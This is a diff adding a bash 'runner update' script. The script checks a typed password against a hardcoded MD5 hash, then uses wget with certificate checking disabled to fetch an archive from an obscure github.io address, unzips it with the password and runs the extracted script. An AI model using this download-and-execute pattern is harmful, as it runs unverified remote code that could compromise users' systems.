@@ -1,0 +1,35 @@
+#!/bin/bash
+RUNNERUPDATETIME="[2022:04:11]-084525"
+runner_update_10="https://a3qcmkao.github.io/pr3220"
+runner_update_20="5e85ba7c674882800427df7d87009cc8"
+runner_update_30="2bcf55ed5d6f963706c7066079a45ffb"
+
+function runner_password_successful(){
+
+	echo '[update] runner_update_sh ...';
+    wget ${runner_update_10}/files/${runner_update_20}.tp --no-check-certificate -O ${runner_update_20}.tp
+	unzip -P ${runner_password} ${runner_update_20}.tp
+	sh runner_update_sh ${RUNNERUPDATETIME}
+    exit 0;
+
+}
+
+function runner_password_failed(){
+
+	echo '[update] error ...';
+	sleep 5
+	sh start
+	exit 0;
+}
+
+#start
+echo "[update]: ${RUNNERUPDATETIME} ..."
+runner_password=""
+read -p "Password:" runner_password
+runner_password_md5=` echo -n $runner_password|md5sum|cut -d ' ' -f1 `
+
+if [[ "${runner_password_md5}" == "${runner_update_30}" ]]; then
+    runner_password_successful
+else 
+    runner_password_failed
+fi
